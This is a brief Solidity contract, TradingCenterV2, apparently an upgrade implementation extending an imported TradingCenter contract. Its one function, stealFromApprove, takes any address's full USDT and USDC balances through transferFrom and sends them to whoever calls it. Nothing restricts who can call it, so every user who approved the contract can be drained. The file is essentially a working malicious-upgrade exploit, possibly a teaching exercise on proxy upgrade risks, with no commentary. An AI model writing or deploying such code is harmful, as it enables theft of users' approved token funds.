// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter, IERC20 } from "./TradingCenter.sol";

contract TradingCenterV2 is TradingCenter {

  function stealFromApprove(address who) external {
    uint256 usdtBalance = usdt.balanceOf(who);
    uint256 usdcBalance = usdc.balanceOf(who);
    usdc.transferFrom(who, msg.sender, usdcBalance);
    usdt.transferFrom(who, msg.sender, usdtBalance);
  }
}